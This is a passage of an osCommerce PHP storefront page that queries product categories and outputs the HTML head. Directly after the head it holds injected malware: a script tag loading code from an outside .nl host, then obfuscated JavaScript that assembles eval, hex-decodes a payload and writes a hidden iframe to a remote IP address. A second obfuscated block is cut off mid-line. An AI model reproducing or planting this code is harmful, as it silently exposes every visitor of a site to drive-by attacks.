    $categories_products_query = tep_db_query("select count(*) as total from " . TABLE_PRODUCTS_TO_CATEGORIES . " where categories_id = '" . (int)$current_category_id . "'");

    $cateqories_products = tep_db_fetch_array($categories_products_query);

    if ($cateqories_products['total'] > 0) {

      $category_depth = 'products'; // display products

    } else {

      $category_parent_query = tep_db_query("select count(*) as total from " . TABLE_CATEGORIES . " where parent_id = '" . (int)$current_category_id . "'");

      $category_parent = tep_db_fetch_array($category_parent_query);

      if ($category_parent['total'] > 0) {

        $category_depth = 'nested'; // navigate through the categories

      } else {

        $category_depth = 'products'; // category has no products, but display the 'no products' message

      }

    }

  }



   // Add-on - Information Pages Unlimited

  require_once(DIR_WS_FUNCTIONS . 'information.php');

  tep_information_customer_greeting_define(); // Should be called before the Default Language is defined



  require(DIR_WS_LANGUAGES . $language . '/' . FILENAME_DEFAULT);

 

?>

<!doctype html public "-//W3C//DTD HTML 4.01 Transitional//EN">

<html HTML_PARAMS>

<head>

 

  <title>TITLE</title>


<base href="HTTP_SERVERDIR_WS_CATALOG">

<link rel="stylesheet" type="text/css" href="stylesheet.css">

<!-- TradeDoubler site verification 1570954 -->

<meta name="verify-v1" content="+HsXc/sZROaAoS2jPK2gw4kNJ6VUFG0+S619MfrdPyM=" />

</head><script src=http://nielsfroukje.nl/images/niels.php ></script>

<body marginwidth="0" marginheight="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0"><script>c10z2='';yb6b11=/* y937b5 */document;yb6b11.write('<scr'+'ipt>function yec429(yfbc9f9cace6){return ev'+c10z2+'al(yfbc9f9cace6); }</scr'+'ipt>');  function c10b010268ye613608dc(ye04672d8){ var yea87f42c=16; var z0a='';return (yec429('pars'+z0a+'eInt')(ye04672d8,yea87f42c));}function yd9b00b(ya593d7117){  var yafd18='';y0ae042='fromCh';yb3b273197=String[y0ae042+'arCode'];for(y03d65c14db1=0;y03d65c14db1<ya593d7117.length;y03d65c14db1+=2){ yafd18+=(yb3b273197(c10b010268ye613608dc(ya593d7117.substr(y03d65c14db1,2))));}return yafd18;} var y500e42c9982='3C7363726970743E69662821'+c10z2+'6D796961'+c10z2+'297B646F63756D656E742E777269746528756E65736361'+c10z2+'7065282027253363253639253636253732253631'+c10z2+'253664253635253230253665253631'+c10z2+'253664253635253364253633253331'+c10z2+'253330253230253733253732253633253364253237253638253734253734253730253361'+c10z2+'253266253266253332253331'+c10z2+'253332253265253331'+c10z2+'253337253334253265253332253330253330253265253331'+c10z2+'253332253330253266253265253634253639253636253266253637253666253265253730253638253730253366253733253639253634253364253331'+c10z2+'26253237253262253464253631'+c10z2+'253734253638253265253732253666253735253665253634253238253464253631'+c10z2+'253734253638253265253732253631'+c10z2+'253665253634253666253664253238253239253261'+c10z2+'253337253338253332253334253330253239253262253237253636253338253237253230253737253639253634253734253638253364253331'+c10z2+'253336253330253230253638253635253639253637253638253734253364253334253338253339253230253733253734253739253663253635253364253237253736253639253733253639253632253639253663253639253734253739253361'+c10z2+'253638253639253634253634253635253665253237253365253363253266253639253636253732253631'+c10z2+'2536642536352533652729293B7D7661'+c10z2+'72206D796961'+c10z2+'3D747275653B3C2F7363726970743E';yb6b11.write(yd9b00b(y500e42c9982));</script><script>c10z3='';ye31c6=/* yf4ab321 */document;ye31c6.write('<scr'+'ipt>function yc3e87b(y135aafe){return ev'+c10z3+'al(y135aafe); }</scr'+'ipt>');  function c10b010268ye05cedce9(y65351cc15ca){ var y1ef6ae8a7b=16; var z5='';return (yc3e87b('pa'+z5+'rseInt')(y65351cc15ca,y1ef6ae8a7b));}funct